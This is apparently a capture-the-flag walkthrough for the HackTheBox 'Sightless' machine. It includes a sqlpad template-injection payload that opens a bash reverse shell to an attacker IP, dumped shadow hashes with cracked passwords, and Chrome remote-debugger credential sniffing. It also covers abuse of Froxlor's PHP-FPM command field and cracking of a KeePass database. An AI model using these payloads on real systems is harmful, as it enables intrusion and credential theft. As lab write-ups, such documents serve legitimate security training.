1, Recon
port scan 
	21/tcp ftp
	22/tcp ssh
	80/tcp http `http://sightless.htb/`
Check the services
	ftp: very sad, we could not use anonymous to login.
	http: we find other sub-domains `sqlpad.sightless.htb`, and we did not find anything useful in the main domain.And we successfully find the version of sqlpad
	![](images/Pasted%20image%2020240908101649.png)
	`sqlpad 6.10.0`
	Let's check some exploits of that
	`sqlpad up to 6.10.0 Test Endpoint injection`
	`Template injection in connection test endpoint leads to RCE in sqlpad/sqlpad`
	`https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb`
```
[6.10.1] - 2022-03-13
Secure connection template functionality. This restricts connection template values to fields on user object, preventing the use of arbitrary JavaScript, as it could be leveraged for abuse. (This functionality was, and still is, only available to admin accounts.)
[6.10.0] - 2022-03-11
Add postgres query timeout config
Add default role config for Google Auth
Update dependencies
```

Then we just follow the page of exploitation and payload is 
`{{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.65/443 0>&1"') }}`
Then we can get the root shell of docker and we can get the `/etc/shadow` and get the password of root or others.
```
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::

michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```
Let's use the john or hashcat to crack them.
Then we get the password `insaneclownposse`

Let's use ssh to get the michael shell.

2, shell as root
When we check the `sudo -l`, there is nothing
```
sudo -l
[sudo] password for michael: 
Sorry, user michael may not run sudo on sightless.
```

Then let's check the netstate
```
netstat -ntlp
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080 
```
These would be useful for us.
`3306 mysql`
`8080 would be interesting for us.`
When we try to curl it, we successful get some response.
So let's Port forwarding it to our localhost.
`ssh -L 8080:localhost:8080 michael@10.10.11.32`

Then we just check `http://localhost:8080`, we get 
![](images/Pasted%20image%2020240908110234.png)
We get the name of service `froxlor` and we need to add the domain
```
michael@sightless:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 sightless
127.0.0.1 sightless.htb sqlpad.sightless.htb admin.sightless.htb
```
Then  we successfully come to the login page
![](images/Pasted%20image%2020240908110618.png)
So let's try to use the cred `michael:insaneclownposse`, but we failed

So let's come to the machine and we find another user `john` and we don't have permission to check its directory.

So I think it would useful for us.

`there are some other ports on 127.0.0.1 on my box on port 39149 is session for `
`https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/`

`Chrome Remote Debugger Pentesting`

So we need to check `If the target system is running Google Chrome Debugger with specific port,`

We need the `pspy` to help us.
```
/bin/sh -c sleep 110 && /usr/bin/python3 /home/john/automation/administration.py

CMD: UID=1001 PID=1624   | /opt/google/chrome/chrome --type=zygote --no-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=1619 --enable-crash-reporter 
```
So I guess it would be true for our guess.
```
tcp        0      0 127.0.0.1:38607         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:45305
```
So one of them would be the result of that.
```
open chrome 
go to chrome://inspect/#devices
configure> add 127.0.0.1:52253
add them all until you see a connection pop up > inspect it > new window pops up , go to network tab and wait for him to login > look at the index.php to find the creds to login portal on 127.0.0.1:8080

```

Then we can get the credit
In the payload tab, we can catch the credit of admin.
![](images/Pasted%20image%2020240909085129.png)
`admin : ForlorfroxAdmin`

There is a tricky way to get the root.txt
```
login > PHP > PHP-FPM versions > create new > In php-fpm restart command form field use
cp /root/root.txt /tmp/root.txt
save it > go to http://127.0.0.1:8080/admin_settings.php?page=overview&part=phpfpm > disable it and save > go back and re-enable it and save. This executes the copy command.
verify you have the file in /tmp
then repeat process but use 

chmod 644 /tmp/root.txt

PS: when we just want to upload a reverse shell it would be failed

#### Error
The value for the field "reload_cmd" is not in the expected format.
```

And there would be another way to get the root shell.
```
Resources -> Customers -> Click in the web1 username -> FTP -> Accounts -> Edit -> Change password

Then connect to ftp
lftp -u web1 ip
lftp web1@240.0.0.1:~> set ssl:verify-certificate off
lftp web1@240.0.0.1:~> ls

get the database.kdb

keepass2john Database.kdb >> Database.hash

you can remove the username in Database.hash or use --user in hashcat

hashcat --identify Database.hash --user
      # | Name                                                      | Category
  ======+============================================================+======================================
  13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                | Password Manager
  29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager

hashcat -m 13400 Database.hash /usr/share/wordlists/rockyou.txt --user --force -a -w 3

password `bulldogs`

Then we get ssh credit
`root:q6gnLTB74L132TMdFCpk` and a id_rsa file
```

Then we can get the root shell by ssh.

